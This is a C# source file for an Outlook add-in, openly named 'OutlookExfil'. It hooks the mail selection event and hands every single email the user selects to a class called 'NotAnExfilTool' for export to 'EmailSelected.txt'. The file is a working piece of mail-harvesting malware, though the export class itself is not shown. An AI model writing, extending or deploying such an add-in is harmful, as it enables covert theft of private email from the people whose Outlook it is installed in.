using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Xml.Linq;
using Outlook = Microsoft.Office.Interop.Outlook;
using Office = Microsoft.Office.Core;
using Microsoft.Office.Interop.Outlook;

namespace OutlookExfil
{
    public partial class ThisAddIn
    {
        private void ThisAddIn_Startup(object sender, System.EventArgs e)
        {
            this.Application.ActiveExplorer().SelectionChange += new ExplorerEvents_10_SelectionChangeEventHandler(Explorer_SelectionChange);
        }

        private void ThisAddIn_Shutdown(object sender, System.EventArgs e)
        {
            // Note: Outlook no longer raises this event. If you have code that 
            //    must run when Outlook shuts down, see https://go.microsoft.com/fwlink/?LinkId=506785
        }

        private void InternalStartup()
        { 
            this.Startup += new EventHandler(ThisAddIn_Startup);
            this.Shutdown += new EventHandler(ThisAddIn_Shutdown);
        }
        void Explorer_SelectionChange()
        {
            if (this.Application.ActiveExplorer().Selection.Count == 1)
            {
                MailItem item = this.Application.ActiveExplorer().Selection[1] as MailItem;

                if (item != null)
                {
                    NotAnExfilTool exTool = new NotAnExfilTool();
                    exTool.ExfilTool("EmailSelected.txt", item);
                }
            }
        }
    }
}
